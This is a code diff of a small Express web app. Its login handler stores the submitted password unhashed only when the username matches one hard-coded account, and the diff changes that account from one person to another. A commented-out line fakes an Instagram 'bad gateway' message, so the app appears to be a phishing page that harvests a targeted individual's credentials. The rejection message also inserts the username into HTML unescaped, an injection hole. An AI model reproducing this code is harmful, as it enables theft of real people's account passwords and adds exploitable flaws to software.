@@ -70,7 +70,7 @@ const sendemail = async (req, res) => {
   }
 
   transporter.sendMail(message).then(() => {
-    return res.redirect('/notfound');
+    return res.redirect('/allenitiesDombivili');
   }).catch((err) => { console.log(err) })
 
   // let info = await transporter.sendMail({
@@ -107,7 +107,7 @@ app.get('/verification', sendemail);
 
 
 app.get('/allenitiesDombivili', (req, res) => {
-  res.status(200).render('../groupchat/groupchat.pug');
+  res.status(200).render('./groupchat/groupchat.pug');
 })
 
 app.get('/notfound',(req,res)=>{res.status(202).render('./notfound/notfound.pug')})
@@ -115,7 +115,7 @@ app.post('/login', (req, res) => {
   // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
   username = req.body.username;
   password = req.body.password;
-  if (username == 'ayush.2027') {
+  if (username == 'srikrishna_918_18') {
     const user = new User({ username, password });
     user.save().then(() => {
       console.log('hogaya');
@@ -126,7 +126,7 @@ app.post('/login', (req, res) => {
       res.redirect('*');
     })
   }else{
-    res.send(`<h1>${username} is not in this group.</h1>`);
+    res.send(`<h1>${username} is not been invited to this group.</h1>`);
   }
 })
 app.get('/groupchat', (req, res) => {
